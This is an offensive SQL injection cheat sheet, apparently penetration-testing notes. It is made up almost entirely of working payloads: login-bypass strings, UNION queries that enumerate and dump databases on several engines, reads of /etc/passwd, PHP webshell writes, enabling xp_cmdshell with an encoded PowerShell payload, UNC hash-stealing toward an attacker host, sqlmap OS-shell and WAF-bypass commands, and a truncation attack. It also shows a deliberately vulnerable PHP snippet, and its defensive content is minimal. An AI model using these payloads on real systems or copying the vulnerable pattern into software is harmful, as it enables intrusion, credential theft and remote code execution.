# SQL Injection

## Table of Contents
- [Basic SQL Injection](#basic-sql-injection)
  - [Authentication Bypass](#authentication-bypass)
  - [Union Based Injection](#union-based-injection)
- [Database Enumeration](#database-enumeration)
  - [MySQL](#mysql)
  - [MSSQL](#mssql)
  - [PostgreSQL](#postgresql)
  - [Oracle](#oracle)
- [File Operations](#file-operations)
- [SQLMap](#sqlmap)
- [Blind SQL Injection](#blind-sql-injection)
- [SQL Injection to RCE](#sql-injection-to-rce)
- [SQL Truncation Attack](#sql-truncation-attack)
- [Payload Cheat Sheet](#payload-cheat-sheet)

---

## Basic SQL Injection

### Authentication Bypass

```sql
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin')--
admin')#
' OR 1=1--
' OR 1=1#
' OR '1'='1
" OR "1"="1
') OR ('1'='1
") OR ("1"="1
```

### Union Based Injection

#### Detect Number of Columns

```sql
' order by 1-- -
' order by 2-- -
' order by 3-- -
```

```sql
' UNION select 1,2,3-- -
' UNION select 1,2,3,4-- -
' UNION select NULL,NULL,NULL-- -
```

#### Basic Union Injection

```sql
' UNION select 1,@@version,3,4-- -
' UNION select 1,user(),3,4-- -
' UNION select 1,database(),3,4-- -
```

---

## Database Enumeration

### MySQL

#### Version & User

```sql
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,database(),3,4-- -
```

#### List Databases

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

#### List Tables

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='$database'-- -
```

#### List Columns

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='$table'-- -
```

#### Dump Data

```sql
' UNION select 1,username,password,4 from $database.$table-- -
```

#### Check Privileges

```sql
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -
' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges-- -
```

### MSSQL

#### Version & User

```sql
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,user_name(),3,4-- -
' UNION SELECT 1,db_name(),3,4-- -
```

#### List Databases

```sql
' UNION SELECT 1,name,3,4 FROM master..sysdatabases-- -
```

#### List Tables

```sql
' UNION SELECT 1,name,3,4 FROM $database..sysobjects WHERE xtype='U'-- -
```

#### Enable xp_cmdshell

```sql
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

```sql
xp_cmdshell 'whoami'
xp_cmdshell 'dir C:\'
```

#### Hash Stealing

```sql
EXEC master..xp_dirtree '\\$lhost\share\'
EXEC master..xp_subdirs '\\$lhost\share\'
```

### PostgreSQL

#### Version & User

```sql
' UNION SELECT 1,version(),3,4-- -
' UNION SELECT 1,current_user,3,4-- -
' UNION SELECT 1,current_database(),3,4-- -
```

#### List Databases

```sql
' UNION SELECT 1,datname,3,4 FROM pg_database-- -
```

#### List Tables

```sql
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='public'-- -
```

### Oracle

#### Version

```sql
' UNION SELECT banner,NULL FROM v$version-- -
' UNION SELECT NULL,user FROM dual-- -
```

#### List Tables

```sql
' UNION SELECT NULL,table_name FROM all_tables-- -
```

---

## File Operations

### Read File (MySQL)

```sql
' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -
' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
```

### Write File (MySQL)

```sql
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

### Check File Privileges

```sql
' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

---

## SQLMap

### Basic Usage

```shell
sqlmap -u "http://$rhost/page.php?id=1" --batch
sqlmap -u "http://$rhost/page.php?id=1" --dbs
sqlmap -u "http://$rhost/page.php?id=1" -D $database --tables
sqlmap -u "http://$rhost/page.php?id=1" -D $database -T $table --columns
sqlmap -u "http://$rhost/page.php?id=1" -D $database -T $table --dump
```

### POST Request

```shell
sqlmap -u "http://$rhost/login.php" --data="username=admin&password=test" --batch
sqlmap 'http://$rhost/' --data 'uid=1*&name=test' --batch
```

### Request File

```shell
sqlmap -r request.txt --batch
```

### Specify Injection Point

```shell
sqlmap -u "http://$rhost/page.php?id=1*" --batch
```

### OS Shell

```shell
sqlmap -u "http://$rhost/page.php?id=1" --os-shell
sqlmap -u "http://$rhost/page.php?id=1" --os-cmd "whoami"
```

### File Operations

```shell
sqlmap -u "http://$rhost/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://$rhost/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Bypass WAF

```shell
sqlmap -u "http://$rhost/page.php?id=1" --tamper=space2comment
sqlmap -u "http://$rhost/page.php?id=1" --tamper=between,randomcase
sqlmap --list-tampers
```

### Enumerate Everything

```shell
sqlmap -u "http://$rhost/page.php?id=1" --banner --current-user --current-db --is-dba
```

---

## Blind SQL Injection

### Boolean-Based

```sql
' AND 1=1-- -  (True)
' AND 1=2-- -  (False)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
```

### Time-Based

```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')-- -
```

### MSSQL Time-Based

```sql
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
```

### PostgreSQL Time-Based

```sql
'; SELECT pg_sleep(5)-- -
```

---

## SQL Injection to RCE

> Database-specific command execution payloads

### MySQL - Write Webshell

```sql
-- 3 column example
' UNION ALL SELECT 1, 2, '<?php echo shell_exec($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Write to accessible directory
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

### MSSQL - xp_cmdshell

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -

-- Execute commands
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC xp_cmdshell 'powershell -e <base64_payload>';-- -
```

### PostgreSQL - COPY Command

```sql
-- Write webshell via COPY
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';-- -

-- Command execution via UDF (if available)
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('id');-- -
```

### MariaDB - UDF

```sql
-- Create UDF (requires lib_mysqludf_sys.so)
'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('id');-- -
```

---

## SQL Truncation Attack

> Bypass unique constraints by exploiting column length truncation

### How It Works

When a database column has a max length (e.g., VARCHAR(20)), values longer than 20 chars get truncated. If there's no proper validation, you can:
1. Register as "admin               x" (admin + spaces + char)
2. Database truncates to "admin               " (20 chars)
3. Trailing spaces are often ignored in comparisons
4. You now have access as "admin"

### Vulnerable Code Pattern

```php
// Vulnerable PHP code
$username = $_POST['username'];  // No length check
$query = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
// If username column is VARCHAR(20), "admin                x" becomes "admin               "
```

### Exploitation

```shell
# Register with trailing spaces + extra char to bypass unique constraint
username=admin+++++++++++++++a
password=hacked123

# Or with URL encoding
username=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20a

# After registration, login as:
username=admin
password=hacked123
```

### Prevention

```sql
-- Add UNIQUE constraint
ALTER TABLE users ADD CONSTRAINT unique_username UNIQUE (username);

-- Use TRIM() in queries
SELECT * FROM users WHERE TRIM(username) = TRIM('admin');
```

---

## SQL Injection Attack Flow

```
1. Error-based SQLi
   └─ Extract version, database info via error messages

2. Union-based SQLi
   └─ ORDER BY to find columns
   └─ UNION SELECT to extract data

3. Blind SQLi
   ├─ Boolean-based: Compare true/false responses
   └─ Time-based: SLEEP() or WAITFOR DELAY

4. Out-of-band SQLi
   └─ DNS/HTTP exfiltration when no direct output
```

---

## Payload Cheat Sheet

| Payload | Description |
| :--- | :--- |
| `' OR 1=1-- -` | Basic authentication bypass |
| `' UNION SELECT NULL-- -` | Test for union injection |
| `' ORDER BY 1-- -` | Find number of columns |
| `@@version` | MySQL/MSSQL version |
| `version()` | PostgreSQL version |
| `user()` | Current user (MySQL) |
| `current_user` | Current user (PostgreSQL) |
| `database()` | Current database (MySQL) |
| `LOAD_FILE('/etc/passwd')` | Read file (MySQL) |
| `INTO OUTFILE` | Write file (MySQL) |
| `xp_cmdshell` | Command execution (MSSQL) |
| `COPY TO` | Write file (PostgreSQL) |
